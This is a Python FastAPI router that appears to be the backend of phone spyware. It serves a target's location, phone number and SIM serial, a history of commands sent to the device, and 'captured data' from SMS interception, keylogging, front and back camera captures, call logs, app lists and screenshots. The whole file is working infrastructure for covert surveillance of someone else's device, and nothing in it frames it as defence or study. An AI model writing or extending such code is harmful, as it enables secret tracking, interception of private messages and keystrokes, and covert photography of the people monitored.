from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from app.database import get_db
from app.models.device import Device
from app.models.command import Command

router = APIRouter(prefix="/v1/monitor", tags=["monitor"])

@router.get("/location/{user_id}")
async def get_location(user_id: str, db: Session = Depends(get_db)):
    devices = db.query(Device).filter(
        Device.user_id == user_id,
        Device.is_online == True
    ).order_by(Device.last_seen.desc()).all()
    
    return [{
        "device_id": d.id,
        "device_name": d.device_name,
        "latitude": d.last_latitude,
        "longitude": d.last_longitude,
        "battery": d.last_battery,
        "wifi": d.last_wifi,
        "last_seen": d.last_seen.isoformat() if d.last_seen else None,
        "is_online": d.is_online,
        "phone_number": d.phone_number,
        "sim_serial": d.sim_serial
    } for d in devices]

@router.get("/commands/{user_id}")
async def get_commands(user_id: str, db: Session = Depends(get_db)):
    """Get command history with results"""
    devices = db.query(Device).filter(Device.user_id == user_id).all()
    device_ids = [d.id for d in devices]
    
    commands = db.query(Command).filter(
        Command.device_id.in_(device_ids)
    ).order_by(Command.created_at.desc()).limit(50).all()
    
    return [{
        "id": c.id,
        "command_type": c.command_type,
        "status": c.status,
        "result": c.result if isinstance(c.result, dict) else {},
        "created_at": c.created_at.isoformat(),
        "executed_at": c.executed_at.isoformat() if c.executed_at else None
    } for c in commands]

@router.get("/data/{user_id}/{data_type}")
async def get_captured_data(user_id: str, data_type: str, db: Session = Depends(get_db)):
    """Get captured data: sms, keystrokes, photos, calls"""
    
    devices = db.query(Device).filter(Device.user_id == user_id).all()
    device_ids = [d.id for d in devices]
    
    type_map = {
        "sms": ["sms_intercept"],
        "photos": ["camera_front", "camera_back"],
        "keystrokes": ["keylog"],
        "calls": ["call_log"],
        "apps": ["app_list"],
        "screenshots": ["screenshot"]
    }
    
    cmd_types = type_map.get(data_type, [data_type])
    
    commands = db.query(Command).filter(
        Command.device_id.in_(device_ids),
        Command.command_type.in_(cmd_types),
        Command.status == "executed"
    ).order_by(Command.executed_at.desc()).limit(50).all()
    
    return [{
        "type": c.command_type,
        "result": c.result if isinstance(c.result, dict) else {},
        "captured_at": c.executed_at.isoformat() if c.executed_at else None
    } for c in commands]
